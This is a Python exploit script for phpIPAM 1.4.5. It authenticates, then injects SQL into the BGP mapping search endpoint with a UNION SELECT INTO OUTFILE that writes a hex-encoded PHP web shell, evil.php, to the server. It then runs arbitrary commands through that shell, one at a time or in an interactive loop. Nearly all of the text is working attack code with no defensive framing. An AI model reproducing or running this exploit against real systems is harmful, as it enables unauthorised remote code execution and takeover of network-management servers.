#!/usr/bin/env python3

import requests
import argparse
from sys import exit, argv
from termcolor import colored
import pyfiglet

banner = pyfiglet.figlet_format("PhpIPAM v1.4.5 SQLI TO RCE")
print(banner)

parser = argparse.ArgumentParser(usage="./sqli-rce.py -u http://localhost:80/ --username username --password password -C 'whoami' --path /system/writable/path/to/save/shell", description="PhpIPAM 1.4.5 - (Authenticated) SQLI to RCE")

parser.add_argument("-url", type=str, help="URL to vulnerable website.", required=True)
parser.add_argument("--username", type=str, help="Username to authenticate.", required=True)
parser.add_argument("--password", type=str, help="Password to authenticate with username.", required=True)
parser.add_argument("-cmd", type=str, help="Command to execute.", default="id")
parser.add_argument("--path", type=str, help="Path to writable system folder and accessible via webserver.", default="/var/www/html")
parser.add_argument("--shell", type=str, help="Spawn a shell (non-interactive)", nargs="?")
args = parser.parse_args()

url = args.url
username = args.username
password = args.password
command = args.cmd
path = args.path

# Validate URL
if url.endswith("/"):
	url = url[:-1]
if not url.startswith("http://") and not url.startswith("https://"):
	print(colored("[!] Please specify a valid scheme (http:// or https://) before the domain.", "yellow"))
	exit()

def login(url, username, password):
	# Takes a username and password and tries to authenticate
	data = {
	"ipamusername": username,
	"ipampassword": password
	}
	print(colored("Trying to log in as {}", "blue").format(username))
	r = requests.post(f"{url}/app/login/login_check.php", data=data)
	if "Invalid username or password" in r.text:
		print(colored("[-] Invalid credentials.", "red"))
		exit()
	else:
		print(colored("[+] Login successful.", "green"))
		return str(r.cookies['phpipam'])

auth_cookie = login(url, username, password)

def exploit(url, auth_cookie, path, command):
	print(colored("[+] Exploiting", "blue"))
	vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
	data = {
	"subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
	"bgp_id": "1"
	}

	cookies = {
	"phpipam": auth_cookie
	}

	requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
	test = requests.get(f"{url}/evil.php")
	if test.status_code != 200:
		return print(colored("[-] Something went wrong. Maybe the path is not writable. You can still abuse of the SQL Injection vulnerability at {}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
	
	if "--shell" in argv:
		while True:
			command = input("Shell> ")
			r = requests.get(f"{url}/evil.php?cmd={command}")
			print(r.text)
	else:
		print(colored("[+] Success! The shell is located at {}/evil.php. Parameter: cmd", "green").format(url))
		r = requests.get(f"{url}/evil.php?cmd={command}")
		print(f"\n\n[+] Output:\n{r.text}")

exploit(url, auth_cookie, path, command)